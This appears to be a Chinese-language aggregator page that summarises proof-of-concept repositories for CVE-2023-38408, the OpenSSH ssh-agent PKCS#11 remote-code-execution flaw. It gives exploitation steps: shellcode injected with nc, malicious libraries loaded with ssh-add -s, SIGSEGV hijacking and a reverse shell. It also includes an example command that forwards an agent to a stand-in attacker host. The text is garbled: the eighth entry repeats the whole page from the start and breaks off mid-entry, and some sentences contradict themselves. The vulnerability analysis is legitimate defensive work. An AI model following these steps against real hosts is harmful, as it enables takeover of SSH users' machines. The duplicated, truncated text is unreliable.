# CVE-2023-38408

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #8

**来源**: [CVE-2023-38408-wxrdnx_CVE-2023-38408.md](../2023/CVE-2023-38408-wxrdnx_CVE-2023-38408.md)

# CVE-2023-38408

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
